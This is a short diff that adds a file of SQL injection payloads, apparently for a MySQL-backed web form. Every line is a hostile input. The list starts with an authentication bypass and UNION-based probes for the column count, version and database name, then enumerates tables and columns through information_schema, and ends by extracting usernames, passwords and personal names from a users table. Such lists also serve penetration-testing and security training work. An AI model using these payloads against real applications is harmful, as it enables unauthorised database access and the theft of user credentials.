@@ -1,0 +1,9 @@
+' or 1=1 -- 
+o' union select 1, 2, 3, 4 -- 
+o' union select 1, version(), 3, 4 -- 
+o' union select 1, database(), 3, 4 -- 
+as' union select null, table_name, null, null from information_schema.tables -- 
+a' union select null, group_concat(table_name separator ','), null, null from information_schema.tables where table_schema not like '%schema%' --  
+a' union select null, group_concat(column_name separator ','), null, null from information_schema.columns where table_name='users' --  
+a' union select null, group_concat(username,' ',password separator ','), null, null from users --  
+a' union select null, group_concat(first_name,' ',last_name separator ','), null, null from users --  
